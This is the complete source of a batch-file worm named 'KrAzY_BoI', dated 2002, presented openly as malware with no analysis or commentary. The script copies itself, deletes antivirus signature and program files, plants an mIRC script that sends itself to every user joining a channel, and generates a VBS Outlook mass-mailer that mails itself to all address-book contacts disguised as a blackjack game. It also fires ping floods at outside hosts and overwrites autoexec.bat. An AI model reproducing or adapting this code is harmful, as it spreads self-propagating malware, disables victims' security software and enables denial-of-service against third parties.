:BAT/KrAzY_BoI
:By adious
:Written on:25/7/02
cls
@echo off

:storing_stufp
copy %0 c:\KrAzY_BoI.bat
copy %0 c:\windows\temp\donkey.bat

:retrofuntion
if exist c:\KrAzY_BoI.bat del c:\programme\norton~1\s32integ.dll
if exist c:\KrAzY_BoI.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\KrAzY_BoI.bat del c:\programme\mcafee\scan.dat
if exist c:\KrAzY_BoI.bat del c:\tbavw95\tbscan.sig

:mIrc_werm
echo [script]>b.bat
echo n0=on 1:JOIN:#:{ >>b.bat
echo n1= /if ( nick == $me ) { halt } >>b.bat
echo n2= /.dcc send $nick c:\KrAzY_BoI.bat >>b.bat
echo n3=} >>b.bat
if exist c:\mirc\mirc.ini copy b.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy b.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy b.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy b.bat c:\progra~1\mirc32\script.ini
del b.bat

:massmailer

echo.on error resume next > c:\X.vbs
echo dim a,b,c,d,e >> c:\X.vbs
echo set a = Wscript.CreateObject("Wscript.Shell") >> c:\X.vbs
echo set b = CreateObject("Outlook.Application") >> c:\X.vbs
echo set c = b.GetNameSpace("MAPI") >> c:\X.vbs
echo for y = 1 To c.AddressLists.Count >> c:\X.vbs
echo set d = c.AddressLists(y) >> c:\X.vbs
echo x = 1 >> c:\X.vbs
echo set e = b.CreateItem(0) >> c:\X.vbs
echo for o = 1 To d.AddressEntries.Count >> c:\X.vbs
echo f = d.AddressEntries(x) >> c:\X.vbs
echo e.Recipients.Add f >> c:\X.vbs
echo x = x + 1 >> c:\X.vbs
echo next >> c:\X.vbs
echo e.Subject = "Hi!" >> c:\X.vbs
echo e.Body = "Here's a great game for all ages.IT's called blackjackel.Have a nice day :)" >> c:\X.vbs
echo e.Attachments.Add ("c:\KrAzY_BoI.bat") >> c:\X.vbs
echo e.DeleteAfterSubmit = False >> c:\X.vbs
echo e.Send >> c:\X.vbs
echo f = "" >> c:\X.vbs
echo next >> c:\X.vbs
start c:\X.vbs

:DoS_attack
ping.exe www.hotmail.com
ping.exe 3000 -l www.smutserver.com
ping.exe 3000 -l www.smutserver.com

:Payload
del c:\autoexec.bat
echo echo 00000000000000000000000000 >c:\autoexec.bat
echo echo KrAzY_BoI made a mark for adious >>c:\autoexec.bat
echo echo byebye >>c:\autoexec.bat
echo echo 00000000000000000000000000 >>c:\autoexec.bat
echo pause >>c:\autoexec.bat

:Bat.KrAzY_BoI
:End 26/7/02